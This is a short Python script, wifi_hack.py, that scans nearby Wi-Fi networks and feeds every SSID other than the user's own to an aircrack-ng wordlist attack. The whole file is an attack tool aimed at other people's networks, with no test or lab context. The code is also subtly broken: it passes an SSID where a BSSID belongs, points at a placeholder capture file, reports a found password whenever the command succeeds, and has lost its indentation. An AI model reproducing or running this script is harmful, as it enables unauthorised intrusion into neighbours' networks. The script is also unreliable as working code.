# filename: wifi_hack.py

import subprocess
import re

def scan_wifi():
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'networks']).decode('utf-8').split('\n')
 ssids = [line.split(':')[1].strip() for line in data if "SSID" in line]
 return ssids

def crack_wifi(ssid):
 # Replace with your own wordlist (e.g., rockyou.txt)
 wordlist_path = r"C:\path\to\wordlist.txt"
 
 # Use Aircrack-ng via Windows Subsystem for Linux or Cygwin
 command = f"aircrack-ng -w {wordlist_path} -b {ssid} .cap"
 
 # Run the command using WSL/Cygwin
 try:
 subprocess.run(command, shell=True, check=True)
 print(f"Password found for {ssid}")
 except subprocess.CalledProcessError as e:
 print(f"Failed to crack {ssid}: {e}")

if __name__ == "__main__":
 nearby_ssids = scan_wifi()
 
 for ssid in nearby_ssids:
 if ssid not in ["YourSavedNetwork1", "YourSavedNetwork2"]:  # Replace with your saved networks
 crack_wifi(ssid)



